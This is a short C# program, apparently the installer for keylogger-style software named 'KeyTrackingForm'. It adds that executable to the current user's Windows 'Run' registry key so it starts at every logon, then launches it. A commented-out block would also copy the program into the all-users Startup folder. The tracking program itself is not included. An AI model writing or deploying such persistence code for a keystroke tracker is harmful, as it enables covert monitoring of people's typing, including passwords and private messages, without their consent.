using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Reflection;
using System.IO;
using System.Diagnostics;

namespace KeyTrackingWriter
{
    static class Program
    {
        static string appPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app", "KeyTrackingForm.exe");

        static void Main()
        {
            /*
            string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
            var exe = Assembly.GetExecutingAssembly().Location;
            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
            var data = File.ReadAllBytes(exe);

            File.WriteAllBytes(destiny, data);


            RegisterInStartup(true);
            */

            RegisterInStartup(true, appPath);

            //var path = Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory + "../../../KeyTrackingForm/bin/Release/KeyTrackingForm.exe");

            Process.Start(appPath);
        }

        private static void RegisterInStartup(bool isChecked, string path)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (isChecked)
            {
                registryKey.SetValue("KeyTrackingForm", path);
            }
            else {
                registryKey.DeleteValue("KeyTrackingForm");
            }
        }

    }
}
